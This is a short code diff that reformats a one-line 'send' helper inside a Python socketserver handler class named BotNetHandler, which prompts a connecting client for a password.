@@ -62,7 +62,8 @@ class BotNetHandler(socketserver.BaseRequestHandler):
 
     def handle(self):
         try:
-            def send(msg): self.request.send(msg.encode())
+            def send(msg):
+                self.request.send(msg.encode())
             bot = self.server.bot
             send("Password: ")
             msg = self.get_data().splitlines()
